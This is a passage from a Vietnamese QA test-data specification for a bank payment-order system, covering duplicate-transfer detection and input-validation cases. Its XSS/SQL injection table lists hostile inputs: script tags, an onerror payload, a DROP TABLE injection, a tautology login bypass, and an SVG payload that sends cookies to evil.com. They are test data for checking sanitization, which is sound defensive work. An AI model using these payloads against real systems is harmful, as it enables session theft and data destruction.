| Ma TC    | Lenh 1 (da ton tai)                                                             | Lenh 2 (dang lap)                                          | Ket qua mong doi                                  |
| -------- | ------------------------------------------------------------------------------- | ---------------------------------------------------------- | ------------------------------------------------- |
| `DUP-01` | SENDER=`BANK_001`, AMOUNT=`100000000`, ORIGIN_NUM=`CT-001`, tao cach day 5 phut | SENDER=`BANK_001`, AMOUNT=`100000000`, ORIGIN_NUM=`CT-001` | Hien `MSG-WRN-DUPLICATE`, cho chon Tiep tuc / Huy |
| `DUP-02` | SENDER=`BANK_001`, AMOUNT=`100000000`, ORIGIN_NUM=`CT-001`, tao cach day 2 ngay | SENDER=`BANK_001`, AMOUNT=`100000000`, ORIGIN_NUM=`CT-001` | Khong canh bao (vuot 30 phut)                     |
| `DUP-03` | SENDER=`BANK_001`, AMOUNT=`200000000`, ORIGIN_NUM=`CT-001`                      | SENDER=`BANK_001`, AMOUNT=`100000000`, ORIGIN_NUM=`CT-001` | Khong canh bao (khac AMOUNT)                      |

### 7.3. XSS / SQL Injection (VAL-10)

| Ma TC    | Truong             | Gia tri nhap                                               | Ket qua mong doi                               |
| -------- | ------------------ | ---------------------------------------------------------- | ---------------------------------------------- |
| `XSS-01` | `DESCRIPTION`      | `<script>alert('xss')</script>`                            | Sanitize/escape, luu an toan, khong render tag |
| `XSS-02` | `DESCRIPTION`      | `"><img src=x onerror=alert(1)>`                           | Sanitize/escape                                |
| `XSS-03` | `SENDER_NAME`      | `Test'; DROP TABLE LTT_PAY_ORDER; --`                      | Sanitize/escape, khong chay SQL                |
| `XSS-04` | `REF_NO`           | `1' OR '1'='1`                                             | Sanitize, reject neu ky tu dac biet            |
| `XSS-05` | `LINE_DESCRIPTION` | `<svg/onload=fetch('http://evil.com?c='+document.cookie)>` | Sanitize/escape                                |

---

## Lich su Sua doi

- **2026-05-19** | **QA Agent** | FT-001 | Tao test data v1.0 — 10 nhom du lieu: User accounts, Valid orders (3 kenh), Invalid data (12 nhom), Boundary values (7 nhom), State transitions, SoD, Optimistic lock, Reference data, Idempotency, Duplicate detection, XSS/SQLi.
